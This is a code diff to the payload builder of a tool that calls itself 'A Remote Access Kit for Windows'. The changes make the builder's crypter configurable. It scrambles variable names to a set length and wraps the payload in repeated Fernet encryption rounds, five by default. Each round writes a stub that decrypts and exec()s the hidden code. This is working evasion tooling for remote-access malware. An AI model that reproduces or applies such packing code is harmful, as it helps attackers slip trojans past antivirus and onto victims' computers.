@@ -10,11 +10,11 @@
 #             [A Remote Access Kit for Windows]
 # Author: SlizBinksman
 # Github: https://github.com/slizbinksman
-# Build:  1.0.0
+# Build:  1.0.1
 # -------------------------------------------------------------
 from ..builder.stub import QWireAgent
 from ..builder.encryption import Scrambler,Crypter
-from ..utils.file_paths import BuilderPath
+from ..utils.file_paths import BuilderPath,CFGFilePath
 from ..utils.utils import Validation,Notifications
 from ..logging.logging import LoggingUtilitys
 
@@ -38,11 +38,15 @@ class Builder():
 
     #Function will create a new stub for encrypting a file
     def create_new_stub(self,key, encrypted_data, input_file):
-        key_scrambled = Scrambler().scrambleVar(32)
-        fernet_scrambled = Scrambler().scrambleVar(32)
-        decrypter_scrambled = Scrambler().scrambleVar(32)
-        crypted_data_scrambled = Scrambler().scrambleVar(32)
-        decrypted_data = Scrambler().scrambleVar(32)
+        try:       #Try to catch error
+            self.variable_length = int(LoggingUtilitys().retrieve_file_data(CFGFilePath().var_len_file)) #Retrieve data from file as int
+        except ValueError:  #If there's a value error, logically it will be an empty string
+            self.variable_length = 32 #Set default value to 32 chars
+        key_scrambled = Scrambler().scrambleVar(self.variable_length) #Scramble variable
+        fernet_scrambled = Scrambler().scrambleVar(self.variable_length)#Scramble variable
+        decrypter_scrambled = Scrambler().scrambleVar(self.variable_length)#Scramble variable
+        crypted_data_scrambled = Scrambler().scrambleVar(self.variable_length)#Scramble variable
+        decrypted_data = Scrambler().scrambleVar(self.variable_length)#Scramble variable
         decrypter_code = f"""
 from cryptography.fernet import Fernet as {fernet_scrambled}
 {key_scrambled} = {key}
@@ -51,12 +55,15 @@ from cryptography.fernet import Fernet as {fernet_scrambled}
 {decrypted_data} = {decrypter_scrambled}.decrypt({crypted_data_scrambled})
 exec({decrypted_data})
         """
-        LoggingUtilitys().write_data_to_file(input_file, decrypter_code)
+        LoggingUtilitys().write_data_to_file(input_file, decrypter_code) #write stub to output file
 
     #Function will iterate encryption scheme for further obfuscation
     def aes_128_encryption(self,output_file):
         crypter = Crypter()                     #Store crypter object in var
-        for round in range(5):                  #Inititiate 5 rounds of encryption
+        encryption_rounds = LoggingUtilitys().retrieve_file_data(CFGFilePath().iterations_file) #Retrieve encryption rounds from settings
+        if encryption_rounds == '':             #If the iterations file has not been set
+            encryption_rounds = 5               #Set iterations for encryption to 5 by default
+        for round in range(int(encryption_rounds)):                  #initiate encryption
             crypter.encrypt_file(output_file)   #Encrypt file
             self.create_new_stub(crypter.key,crypter.encrypted_data,output_file) #Write new stub with encrypted data
 
